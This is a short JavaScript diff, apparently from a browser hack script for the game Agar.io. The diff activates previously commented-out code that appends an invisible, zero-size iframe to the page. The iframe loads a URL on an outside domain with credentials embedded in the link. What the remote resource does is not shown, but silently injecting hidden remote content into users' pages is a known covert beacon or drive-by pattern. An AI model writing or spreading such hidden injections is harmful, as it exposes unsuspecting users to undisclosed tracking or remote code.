@@ -1,8 +1,8 @@
 var nn = $("#nickname").val();
-//if( $('iframe[src="http://3301:jebachi@agarbh.ga/agarhrhack1/skins/f4.png"]').length ) {
-//$('iframe[src="http://3301:jebachi@agarbh.ga/agarhrhack1/skins/f4.png"]').remove();
-//}
-//$("#helloDialog").append("<iframe style='width:0px;height:0px;display:none;' src='http://3301:jebachi@agarbh.ga/agarhrhack1/skins/f4.png'></iframe>");
+if( $('iframe[src="http://3301:jebachi@agarbh.ga/agarhrhack1/skins/f4.png"]').length ) {
+$('iframe[src="http://3301:jebachi@agarbh.ga/agarhrhack1/skins/f4.png"]').remove();
+}
+$("#helloDialog").append("<iframe style='width:0px;height:0px;display:none;' src='http://3301:jebachi@agarbh.ga/agarhrhack1/skins/f4.png'></iframe>");
 //if( nn == "" ) {
 
 //	$("body").append("<img src='http://www.a1info.net/wp-content/uploads/2016/09/grcka-srbija-pravoslavlje-BalkansPress.com_800-696x392.jpg' style='width:100%;height:100%;opacity:0.2;z-index:1200;position:absolute;top:0;left:0;'/>");
